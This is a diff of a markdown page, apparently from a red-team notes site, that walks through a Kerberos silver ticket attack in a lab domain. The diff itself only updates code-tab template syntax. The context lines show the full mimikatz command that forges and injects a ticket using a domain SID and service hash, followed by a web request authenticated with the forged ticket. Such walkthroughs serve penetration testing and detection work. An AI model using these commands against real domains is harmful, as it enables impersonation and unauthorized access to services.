@@ -30,13 +30,13 @@ Getting our user's SID as explained in the first step in the above table:
 
 Issuing the final mimikatz command to create our forged \(silver\) ticket:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 mimikatz # kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:beningnadmin
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Checking available tickets in memory with `klist` - note how the ticket shows our forged username `benignadmin` and a forged user id:
 
@@ -56,13 +56,13 @@ Note in the above mimikatz window the `Group IDs` which our fake user `benignadm
 
 Initiating a request to the attacked service with a TGS ticket - note that the authentication is successfull:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials http://dc-mantvydas.offense.local
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/silver-tickets-httprequest.png)
 
